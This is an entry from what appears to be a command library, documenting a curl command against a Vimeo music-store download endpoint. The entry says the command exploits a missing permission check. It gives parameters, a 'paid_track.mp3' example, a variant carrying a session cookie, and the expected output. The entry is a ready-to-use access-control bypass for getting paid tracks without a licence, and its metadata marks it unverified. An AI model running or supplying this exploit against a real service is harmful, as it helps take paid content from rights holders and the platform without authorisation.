---
id: cmd-curl-vimeo-download
data: >-
  curl -L "https://vimeo.com/musicstore/download?track_id=110947&license_id=4"
  -o track.mp3
tags:
  - web
  - download
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:51.809Z'
verified: false
validated: true
submitted: true
---
# curl-download-vimeo-track

## Command

```bash
curl -L "https://vimeo.com/musicstore/download?track_id=110947&license_id=4" -o track.mp3
```

## Description

This command sends a GET request to Vimeo's download endpoint with a track_id and license_id, following redirects (-L) to download the track file to track.mp3, exploiting the missing permission check.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-L` | Follow HTTP redirects (e.g., to S3) | Yes |
| `track_id` | ID of the target track (e.g., 110947) | Yes |
| `license_id` | License type (e.g., 4 for default) | Yes |
| `-o track.mp3` | Output file name for the downloaded track | Yes |

## Examples

### Basic Usage

```bash
curl -L "https://vimeo.com/musicstore/download?track_id=110947&license_id=4" -o paid_track.mp3
```

### Advanced Usage

```bash
curl -L -H "Cookie: vimeo_session=abc123" "https://vimeo.com/musicstore/download?track_id=110947&license_id=4" -o track.mp3
```

## Expected Output

The command downloads the MP3 file to the specified output (e.g., track.mp3 ~3-5MB), with HTTP 302 redirect to S3 in verbose mode (-v). Success: File saved without errors; failure: 403 or redirect denial.

## Related

- [[Related Procedure]]
